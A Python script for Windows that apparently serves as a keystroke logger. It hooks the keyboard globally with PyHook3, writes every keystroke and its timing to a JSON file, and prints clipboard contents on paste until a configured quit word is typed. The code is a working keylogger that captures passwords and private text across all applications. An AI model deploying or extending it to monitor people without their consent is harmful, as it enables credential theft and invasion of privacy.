from ctypes import *
import pythoncom
import PyHook3
import win32clipboard
import os
import sys

import json
import time

path = os.getcwd()

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
# 退出監聽的指令單詞，可以修改
""" 
QUIT_WORD = "BIGBANG" 
"""
# ======== CONST FROM CONFIG =========
with open('config.json', 'r') as f:
    data = json.load(f)

QUIT_WORD = data['QUIT_KEY_DETECT_WORD']
LOG_FILENAME = data['KEY_DETECT_LOG_NAME']
LOG_TEMPLATE = data['DETECT_LOG_TEMPLATE']

# ======== CONST FROM CONFIG =========
QUIT_CONT = QUIT_WORD
currentTime = time.time()
# Fkey=["F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"]
# 定義擊鍵監聽事件函數

# =======CLEAR THE FORMER LOGS ========

with open(path+LOG_FILENAME, 'w', encoding="utf-8") as f:
    LOG_TEMPLATE["START_TIME"] = time.ctime()
    json.dump(LOG_TEMPLATE, f)

# =======CLEAR THE FORMER LOGS ========


def OnKeyboardEvent(event):
    global current_window, QUIT_WORD, QUIT_CONT, path, currentTime
    FileStr = ""

    if(len(QUIT_WORD) == 0):
        # FileStr += "\n--------------------結束監聽--------------------\n\n\n"
        # fp = open(path+LOG_FILENAME, "a", encoding='utf-8')
        # fp.write(FileStr)
        # fp.close()
        # print("\n--------------------結束監聽--------------------\n")
        with open('KeyBoardListen.json', 'r') as fr:
            temp = json.load(fr)
            temp['INPUT_LOG'] += FileStr

        with open('KeyBoardListen.json', 'w') as fw:

            temp['END_TIME'] = time.ctime()
            temp['INTERVALS'].append(round(time.time() - currentTime))
            json.dump(temp, fw)

        currentTime = time.time()
        sys.exit()
        return False
    # 檢測目標窗口是否轉移(換了其他窗口就監聽新的窗口)
    if event.Window != current_window:
        current_window = event.Window
        # event.WindowName有時候會不好用
        # 所以調用底層API喊來獲取窗口標題
        # windowTitle = create_string_buffer(512)
        # windll.user32.GetWindowTextA(event.Window,
        #                              byref(windowTitle),
        #                              512)
        # windowName = windowTitle.value.decode('gbk')
        # FileStr += "\n"+("-"*60) + \
        #     "\n窗口名:%s\n窗口ID:%s\n" % (windowName, event.Window)
        # print("\n-----------------")
        # print("窗口名:%s" % windowName)
        # print("窗口ID:%s" % event.Window)
    # 檢測擊鍵是否常規按鍵（非組合鍵等）
    if event.Ascii > 32 and event.Ascii < 127:
        FileStr += chr(event.Ascii)+' '
        print(chr(event.Ascii), end=' ')
    else:
        # 如果發現Ctrl+v（粘貼）事件，就把粘貼板內容記錄下來
        if event.Key == "V":
            print()
            print("-"*60)
            print("檢測到粘貼快捷鍵")
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[粘貼內容] %s" % (pasted_value), end=' ')
            print()
            print("-"*60)
            # FileStr += '\n'+("-"*60)+'\n'+"檢測到粘貼快捷鍵\n"
            # FileStr += "[粘貼內容] "+pasted_value
            # FileStr += "\n"
            # FileStr += ("-"*60)+'\n'
        elif event.Key == "Z":
            FileStr += "[Ctrl+Z] "
            print("[Ctrl+Z]", end=' ')
        elif event.Key == "A":
            FileStr += "[Select All] "
            print("[Select All]", end=' ')
        elif event.Key == "C":
            FileStr += "[Ctrl+C] "
            print("[Ctrl+C]", end=' ')
        else:
            if(event.Key == "Space"):
                FileStr += "[Space] "
                print("[Space]", end=' ')
            elif(event.Key == "Lshift"):
                FileStr += "[LShift] "
                print("[LShift]", end=' ')
            elif(event.Key == "Left"):
                FileStr += "[Left] "
                print("[Left]", end=' ')
            elif(event.Key == "Right"):
                FileStr += "[Right] "
                print("[Right]", end=' ')
            elif(event.Key == "Up"):
                FileStr += "[Up] "
                print("[Up]", end=' ')
            elif(event.Key == "Down"):
                FileStr += "[Down] "
                print("[Down]", end=' ')
            elif(event.Key == "Lmenu"):
                FileStr += "[LAlt] "
                print("[LAlt]", end=' ')
            elif(event.Key == "Rmenu"):
                FileStr += "[RAlt] "
                print("[RAlt]", end=' ')
            elif(event.Key == "Rshift"):
                FileStr += "[RShift] "
                print("[RShift]", end=' ')
            elif(event.Key == "Lcontrol"):
                FileStr += "[LCtrl] "
                print("[LCtrl]", end=' ')
            elif(event.Key == "Rcontrol"):
                FileStr += "[RCtrl] "
                print("[RCtrl]", end=' ')
            elif(event.Key == "Return"):
                FileStr += "[Enter] "
                print("[Enter]", end=' ')
            elif(event.Key == "Back"):
                FileStr += "[Delete] "
                print("[Delete]", end=' ')
            elif(event.Key == "Delete"):
                FileStr += "[Del] "
                print("[Del]", end=' ')
            elif(event.Key == "Insert"):
                FileStr += "[Ins] "
                print("[Ins]", end=' ')
            elif(event.Key == "Prior"):
                FileStr += "[PgUp] "
                print("[PgUp]", end=' ')
            elif(event.Key == "Next"):
                FileStr += "[PgDn] "
                print("[PgDn]", end=' ')
            elif(event.Key == "End"):
                FileStr += "[End] "
                print("[End]", end=' ')
            elif(event.Key == "Home"):
                FileStr += "[Home] "
                print("[Home]", end=' ')
            elif(event.Key == "None"):
                FileStr += "[None] "
                print("[None]", end=' ')
            elif(event.Key == "Apps"):
                # 就是RAltR邊的那個鍵
                FileStr += "[Menu] "
                print("[Menu]", end=' ')
            elif(event.Key == "Capital"):
                FileStr += "[Caps] "
                print("[Caps]", end=' ')
            elif(event.Key == "Tab"):
                FileStr += "[Tab] "
                print("[Tab]", end=' ')
            elif(event.Key == "Lwin"):
                FileStr += "[LWin] "
                print("[LWin]", end=' ')
            elif(event.Key == "Rwin"):
                FileStr += "[RWin] "
                print("[RWin]", end=' ')
            elif(event.Key == "Escape"):
                FileStr += "[Esc] "
                print("[Esc]", end=' ')
            elif(event.Key == "Pause"):
                # 就是PrintScreenR邊那個鍵
                FileStr += "[Pause] "
                print("[Pause]", end=' ')
            elif(event.Key == "Snapshot"):
                FileStr += "[ScreenShot] "
                print("[ScreenShot]", end=' ')
            else:
                FileStr += "[%s] " % event.Key
                print("[%s]" % event.Key, end=' ')
    # 判斷退出監聽指令符
    if (event.Key == QUIT_WORD[0]):
        QUIT_WORD = QUIT_WORD[1:]
        if(len(QUIT_WORD) == 0):
            """ 
            FileStr += "\n--------------------結束監聽--------------------\n\n\n"
            fp = open(path+LOG_FILENAME, "a", encoding='utf-8')
            fp.write(FileStr)
            fp.close()
            print("\n--------------------結束監聽--------------------\n") 
            """

            with open('KeyBoardListen.json', 'r') as fr:
                temp = json.load(fr)
                temp['INPUT_LOG'] += FileStr

            with open('KeyBoardListen.json', 'w') as fw:
                temp['END_TIME'] = time.ctime()
                temp['INTERVALS'].append(round(time.time() - currentTime))

                json.dump(temp, fw)
            currentTime = time.time()
            sys.exit()
            return False
    else:
        QUIT_WORD = QUIT_CONT
    # 寫入文件
    # fp = open(path+LOG_FILENAME, "a", encoding='utf-8')
    # fp.write(FileStr)
    # fp.close()
    with open('KeyBoardListen.json', 'r') as fr:
        temp = json.load(fr)
        temp['INPUT_LOG'] += FileStr

    with open('KeyBoardListen.json', 'w') as fw:
        # temp['END_TIME'] = time.time()
        temp['INTERVALS'].append(time.time() - currentTime)
        json.dump(temp, fw)
    # 循環監聽下一個擊鍵事件
    currentTime = time.time()
    return True


# 創建並註冊hook管理器
kl = PyHook3.HookManager()  #
kl.KeyDown = OnKeyboardEvent

# 註冊hook並執行
kl.HookKeyboard()
pythoncom.PumpMessages()
